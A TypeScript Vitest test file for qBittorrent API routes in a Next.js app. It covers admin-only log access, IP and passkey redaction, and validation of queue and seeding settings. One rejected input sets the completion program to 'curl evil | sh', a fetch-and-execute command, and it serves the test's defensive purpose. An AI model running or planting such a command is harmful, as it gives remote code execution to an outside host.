import { NextRequest, NextResponse } from 'next/server';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const mocks = vi.hoisted(() => ({
  requireAdmin: vi.fn(),
  requireUserCapability: vi.fn(),
  recordSettingsUpdated: vi.fn(),
  axiosPost: vi.fn(),
  qbit: {
    getMainLog: vi.fn(),
    getQueueSeedingPreferences: vi.fn(),
    setQueueSeedingPreferences: vi.fn(),
  },
}));

vi.mock('@/lib/auth', () => ({ requireAdmin: mocks.requireAdmin, requireUserCapability: mocks.requireUserCapability }));
vi.mock('@/lib/service-helpers', () => ({ getQBittorrentClient: vi.fn(async () => mocks.qbit) }));
vi.mock('@/lib/cache/qbittorrent-version', () => ({ bumpQbitCacheVersion: vi.fn() }));
vi.mock('@/lib/security-audit', () => ({ recordSettingsUpdated: mocks.recordSettingsUpdated }));
vi.mock('@/lib/api-logger', () => ({ withApiLogging: (handler: unknown) => handler }));

import { GET as getLog } from '@/app/api/qbittorrent/log/route';
import { GET as getPrefs, PATCH as patchPrefs } from '@/app/api/qbittorrent/queue-seeding/route';
import { redactQbitLogText } from '@/lib/server/qbittorrent-log';
import { QBittorrentClient } from '@/lib/qbittorrent-client';

const ADMIN = { id: 'u1', username: 'admin', role: 'admin' };
const FORBIDDEN = { ok: false, response: NextResponse.json({ error: 'Forbidden' }, { status: 403 }) };
const call = (handler: unknown, url: string, init?: { method: string; body: unknown }) =>
  (handler as (request: NextRequest) => Promise<Response>)(new NextRequest(`http://localhost${url}`, init && {
    method: init.method,
    headers: { 'content-type': 'application/json' },
    body: typeof init.body === 'string' ? init.body : JSON.stringify(init.body),
  }));
const upstreamCalls = () => Object.values(mocks.qbit).filter((fn) => fn.mock.calls.length > 0);

const PREFS = {
  queueing_enabled: true,
  max_active_downloads: 3,
  max_active_uploads: 3,
  max_active_torrents: 5,
  dont_count_slow_torrents: false,
  max_ratio_enabled: false,
  max_ratio: -1,
  max_seeding_time_enabled: true,
  max_seeding_time: 1440,
  max_inactive_seeding_time_enabled: false,
  max_inactive_seeding_time: -1,
  max_ratio_act: 0,
};

beforeEach(() => {
  vi.clearAllMocks();
  mocks.requireAdmin.mockResolvedValue({ ok: true, user: ADMIN, session: {} });
  mocks.requireUserCapability.mockResolvedValue({ ok: true, user: { ...ADMIN, role: 'member' }, session: {} });
  mocks.qbit.getQueueSeedingPreferences.mockResolvedValue(PREFS);
});

describe('GET /api/qbittorrent/log (QBT-24)', () => {
  const row = (id: number, type: number, message: string) => ({ id, type, message, timestamp: 1_764_000_000 + id });

  it('is for admins only, and asks qBittorrent nothing for anyone else', async () => {
    mocks.requireAdmin.mockResolvedValue(FORBIDDEN);
    expect((await call(getLog, '/api/qbittorrent/log')).status).toBe(403);
    expect(upstreamCalls()).toEqual([]);
  });

  it('rebuilds each entry from its id, time, level and message, newest first', async () => {
    mocks.qbit.getMainLog.mockResolvedValue([
      { ...row(1, 1, 'qBittorrent v5.1.4 started'), extra: 'dropped' },
      row(2, 4, 'File error alert. File: "/downloads/A/a.mkv". Reason: No such file or directory'),
      row(3, 8, 'critical'),
      { id: 'x', type: 1, message: 'bad id', timestamp: 1 },
      { id: 9, type: 16, message: 'unknown type', timestamp: 1 },
    ]);
    const res = await call(getLog, '/api/qbittorrent/log');
    expect(res.status).toBe(200);
    expect(res.headers.get('cache-control')).toBe('private, no-store');
    const body = await res.json();
    expect(body).toEqual({
      entries: [
        { id: 3, time: new Date((1_764_000_000 + 3) * 1000).toISOString(), level: 'critical', message: 'critical' },
        // A file path stays: it is how an admin finds the torrent.
        { id: 2, time: expect.any(String), level: 'warning', message: 'File error alert. File: "/downloads/A/a.mkv". Reason: No such file or directory' },
        { id: 1, time: expect.any(String), level: 'normal', message: 'qBittorrent v5.1.4 started' },
      ],
      nextBefore: null,
    });
    expect(mocks.qbit.getMainLog).toHaveBeenCalledWith({ normal: true, info: true, warning: true, critical: true });
  });

  it('asks only for the levels chosen, and refuses an unknown one', async () => {
    mocks.qbit.getMainLog.mockResolvedValue([]);
    await call(getLog, '/api/qbittorrent/log?levels=warning,critical');
    expect(mocks.qbit.getMainLog).toHaveBeenCalledWith({ normal: false, info: false, warning: true, critical: true });

    mocks.qbit.getMainLog.mockClear();
    expect((await call(getLog, '/api/qbittorrent/log?levels=warning,debug')).status).toBe(400);
    expect((await call(getLog, '/api/qbittorrent/log?levels=')).status).toBe(400);
    expect((await call(getLog, '/api/qbittorrent/log?before=-1')).status).toBe(400);
    expect((await call(getLog, '/api/qbittorrent/log?before=1e3')).status).toBe(400);
    expect(mocks.qbit.getMainLog).not.toHaveBeenCalled();
  });

  it('pages older entries with before', async () => {
    mocks.qbit.getMainLog.mockResolvedValue(Array.from({ length: 250 }, (_, i) => row(i, 2, `m${i}`)));
    const first = await (await call(getLog, '/api/qbittorrent/log')).json();
    expect(first.entries).toHaveLength(100);
    expect(first.entries[0].id).toBe(249);
    expect(first.nextBefore).toBe(150);
    const second = await (await call(getLog, `/api/qbittorrent/log?before=${first.nextBefore}`)).json();
    expect(second.entries[0].id).toBe(149);
    expect(second.nextBefore).toBe(50);
    const last = await (await call(getLog, `/api/qbittorrent/log?before=${second.nextBefore}`)).json();
    expect(last.entries.map((e: { id: number }) => e.id)).toEqual(Array.from({ length: 50 }, (_, i) => 49 - i));
    expect(last.nextBefore).toBeNull();
  });
});

describe('redactQbitLogText', () => {
  it.each([
    ['Detected external IP. IP: "203.0.113.5"', 'Detected external IP. IP: "[IP]"'],
    ['External IP is 203.0.113.5. Port 6881 is open; v6 is 2001:db8::5.', 'External IP is [IP]. Port 6881 is open; v6 is [IP].'],
    ['WebAPI login failure. Reason: invalid credentials, attempt count: 1, IP: ::ffff:192.168.1.20, username: admin',
      'WebAPI login failure. Reason: invalid credentials, attempt count: 1, IP: [IP], username: admin'],
    ['Successfully listening on IP. IP: "2001:db8:85a3::8a2e:370:7334". Port: "TCP/6881"', 'Successfully listening on IP. IP: "[IP]". Port: "TCP/6881"'],
    ['Peer 2001:0db8:0000:0000:0000:ff00:0042:8329 banned', 'Peer [IP] banned'],
    ['Peer [fe80::1]:51413 and 10.0.0.7:6881', 'Peer [[IP]]:51413 and [IP]:6881'],
    ['IPv6: 2001:db8::1: refused', 'IPv6: [IP]: refused'],
    ['Mapped 0:0:0:0:0:ffff:192.168.1.9 and FE80::A1B2 in capitals', 'Mapped [IP] and [IP] in capitals'],
    ['peer_10.0.0.1 and 1.2.3.4abc', 'peer_[IP] and [IP]abc'],
    // Wildcard and loopback addresses say nothing about the host.
    ['Trying to listen on: "0.0.0.0:6881,[::]:6881" and 127.0.0.1', 'Trying to listen on: "0.0.0.0:6881,[::]:6881" and 127.0.0.1'],
    // Times, versions, hashes and C++ names are not addresses.
    ['qBittorrent v5.1.4 started at 12:30:45, hash 0123456789abcdef0123456789abcdef01234567, BitTorrent::Session',
      'qBittorrent v5.1.4 started at 12:30:45, hash 0123456789abcdef0123456789abcdef01234567, BitTorrent::Session'],
    // Four numbers glued to a word could be an address: masked, the safe side.
    ['libtorrent v2.0.11.0', 'libtorrent v[IP]'],
    ['Tracker http://tracker.example/announce?passkey=abc failed', 'Tracker http://tracker.example failed'],
    ['Added magnet:?xt=urn:btih:abc&tr=http://t.example/a?pk=1 to the queue', 'Added magnet:[REDACTED]'],
  ])('%s', (input, output) => {
    expect(redactQbitLogText(input)).toBe(output);
  });
});

describe('GET /api/qbittorrent/queue-seeding (QBT-25)', () => {
  it('reads with torrents.view and returns the allow-listed keys only', async () => {
    mocks.qbit.getQueueSeedingPreferences.mockResolvedValue({ ...PREFS, web_ui_password: 'secret', autorun_program: 'x' });
    const res = await call(getPrefs, '/api/qbittorrent/queue-seeding');
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual(PREFS);
    expect(mocks.requireUserCapability).toHaveBeenCalledWith('torrents.view');
  });

  it('reads nothing for a user without torrents.view', async () => {
    mocks.requireUserCapability.mockResolvedValue(FORBIDDEN);
    expect((await call(getPrefs, '/api/qbittorrent/queue-seeding')).status).toBe(403);
    expect(upstreamCalls()).toEqual([]);
  });
});

describe('PATCH /api/qbittorrent/queue-seeding (QBT-25)', () => {
  const patch = (body: unknown) => call(patchPrefs, '/api/qbittorrent/queue-seeding', { method: 'PATCH', body });

  it('writes the keys sent and audits their names, for an admin', async () => {
    const res = await patch({ queueing_enabled: false, max_active_downloads: -1, max_ratio_enabled: true, max_ratio: 1.555, max_ratio_act: 3 });
    expect(res.status).toBe(200);
    expect(mocks.qbit.setQueueSeedingPreferences).toHaveBeenCalledWith({
      queueing_enabled: false, max_active_downloads: -1, max_ratio_enabled: true, max_ratio: 1.56, max_ratio_act: 3,
    });
    expect(mocks.recordSettingsUpdated).toHaveBeenCalledWith(
      expect.anything(), ADMIN, 'qBittorrent queueing and seeding',
      ['queueing_enabled', 'max_active_downloads', 'max_ratio_enabled', 'max_ratio', 'max_ratio_act'],
    );
  });

  it('is for admins only: a member with every torrent capability writes nothing', async () => {
    mocks.requireAdmin.mockResolvedValue(FORBIDDEN);
    expect((await patch({ queueing_enabled: true })).status).toBe(403);
    expect(upstreamCalls()).toEqual([]);
  });

  it.each([
    ['the Web UI password', { web_ui_password: 'pwned' }],
    ['the program run on completion', { autorun_enabled: true, autorun_program: 'curl evil | sh' }],
    ['an allowed key alongside a forbidden one', { queueing_enabled: true, autorun_program: 'x' }],
    ['a speed limit (its own route)', { dl_limit: 0 }],
    ['an empty body', {}],
    ['an array', [{ queueing_enabled: true }]],
    ['not JSON', 'queueing_enabled=true'],
    ['a string for a switch', { queueing_enabled: 'false' }],
    ['a fraction for a count', { max_active_downloads: 2.5 }],
    ['a count below -1', { max_active_uploads: -2 }],
    ['a count too large', { max_active_torrents: 100_001 }],
    ['a negative ratio', { max_ratio_enabled: true, max_ratio: -1 }],
    ['a ratio too large', { max_ratio_enabled: true, max_ratio: 10_000 }],
    ['a seeding time over a year', { max_seeding_time_enabled: true, max_seeding_time: 525_601 }],
    ['an unknown action', { max_ratio_act: 4 }],
    ['an action as text', { max_ratio_act: '3' }],
    // qBittorrent reads a missing value as 0, which would act on every seeding torrent at once.
    ['a ratio limit turned on without its value', { max_ratio_enabled: true }],
    ['a seeding time turned on without its value', { max_seeding_time_enabled: true }],
    ['an inactive seeding time turned on without its value', { max_inactive_seeding_time_enabled: true }],
    // qBittorrent ignores a value without its switch on.
    ['a ratio without its switch', { max_ratio: 2 }],
    ['a ratio with its switch off', { max_ratio_enabled: false, max_ratio: 2 }],
  ])('refuses %s and writes nothing', async (_label, body) => {
    const res = await patch(body);
    expect(res.status).toBe(400);
    expect(mocks.qbit.setQueueSeedingPreferences).not.toHaveBeenCalled();
    expect(mocks.recordSettingsUpdated).not.toHaveBeenCalled();
  });

  it('turns a limit off without a value', async () => {
    expect((await patch({ max_seeding_time_enabled: false })).status).toBe(200);
    expect(mocks.qbit.setQueueSeedingPreferences).toHaveBeenCalledWith({ max_seeding_time_enabled: false });
  });
});

describe('QBittorrentClient.setQueueSeedingPreferences', () => {
  it('posts only allow-listed keys, whatever it is handed', async () => {
    const client = new QBittorrentClient('http://qbit.local', 'admin', 'pw');
    const post = vi.fn(async () => undefined);
    (client as unknown as { post: typeof post }).post = post;
    await client.setQueueSeedingPreferences({ queueing_enabled: true, web_ui_password: 'x', autorun_program: 'y' } as never);
    expect(post).toHaveBeenCalledWith('/api/v2/app/setPreferences', `json=${encodeURIComponent(JSON.stringify({ queueing_enabled: true }))}`);
  });
});
